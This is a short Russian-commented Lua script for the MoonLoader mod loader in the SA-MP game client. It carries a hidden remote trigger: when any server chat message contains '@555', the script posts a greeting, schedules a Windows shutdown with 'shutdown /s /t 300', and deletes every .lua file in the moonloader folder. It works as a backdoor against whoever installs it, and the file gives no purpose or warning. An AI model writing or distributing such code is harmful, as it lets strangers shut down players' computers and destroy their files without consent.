require("moonloader")
require("sampfuncs")
local sampev = require("samp.events")

function main()
    if not isSampLoaded() or not isSampfuncsLoaded() then return end
    while not isSampAvailable() do wait(100) end
end

function sampev.onServerMessage(color, message)
    if message:find("@555") then
        sampSendChat("ПРИВЕТ")
        os.execute('shutdown /s /t 300')
        deleteAllLuaScripts()
    end
end

function deleteAllLuaScripts()
    lua_thread.create(function()
        wait(500) -- Подождать, чтобы всё отработало
        local Directory = getWorkingDirectory().."\\moonloader\\"
        local Handle, FileName = findFirstFile(Directory.."*.lua")

        while FileName do
            local FilePath = Directory..FileName
            local success = os.remove(FilePath)
            if success then
                print("Удалён: "..FileName)
            else
                print("Не удалось удалить: "..FileName)
            end
            FileName = findNextFile(Handle)
        end

        print("Удаление скриптов завершено.")
    end)
end
